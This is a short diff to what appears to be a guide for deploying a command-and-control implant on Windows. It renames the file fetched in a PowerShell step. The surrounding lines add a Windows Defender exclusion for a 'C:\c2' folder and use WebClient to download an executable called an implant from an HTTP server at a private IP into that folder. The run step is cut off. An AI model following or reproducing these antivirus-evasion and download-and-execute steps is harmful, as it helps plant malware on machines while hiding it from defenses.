@@ -35,7 +35,7 @@ Add-MpPreference -ExclusionPath "C:\c2"
 Download and execute the implant:
 
 ```powershell
-$url = "http://192.168.1.150:8080/proba.exe"
+$url = "http://192.168.1.150:8080/test.exe"
 $out = "C:\c2\test.exe"
 $cl  = New-Object System.Net.WebClient
 $cl.DownloadFile($url, $out)
